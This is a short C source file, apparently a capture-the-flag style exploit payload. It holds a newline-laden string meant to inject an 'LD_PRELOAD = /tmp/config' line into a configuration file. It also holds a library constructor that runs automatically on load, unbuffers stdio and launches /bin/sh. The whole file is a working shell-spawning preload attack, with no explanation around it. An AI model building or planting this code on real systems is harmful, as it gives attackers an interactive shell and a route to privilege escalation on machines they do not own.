#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char* magic_string = "\x0aLD_PRELOAD = /tmp/config\x0a";

__attribute__((constructor))
void get_shell() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    system("/bin/sh");
}